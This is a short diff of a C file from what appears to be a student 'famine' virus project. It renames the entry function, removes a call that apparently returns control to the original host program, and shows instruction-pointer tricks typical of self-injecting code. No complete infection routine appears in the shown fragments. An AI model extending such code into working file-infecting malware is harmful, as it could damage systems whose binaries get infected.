@@ -6,7 +6,7 @@
 /*   By: nguiard <nguiard@student.42.fr>            +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2024/09/09 03:01:26 by nguiard           #+#    #+#             */
-/*   Updated: 2024/11/21 16:21:18 by nguiard          ###   ########.fr       */
+/*   Updated: 2024/11/25 12:25:26 by nguiard          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -14,7 +14,7 @@
 
 #define BUFF_SIZE 0x1000
 
-void _start() {
+void famine() {
 	byte		*start_rip;
 	get_rip(start_rip);
 
@@ -27,7 +27,7 @@ void _start() {
 	dirent		*d;
 	uint64_t	string = 0x000a303132333435;
 	profiling	this;
-	
+
 	start_rip -= 0x12;
 	this = get_profiling(start_rip);
 	(void)this;
@@ -90,6 +90,4 @@ void _start() {
 	}
 
 	write(ret, 1, &string, 8);
-
-	the_point_of_no_return(this.original);
 }
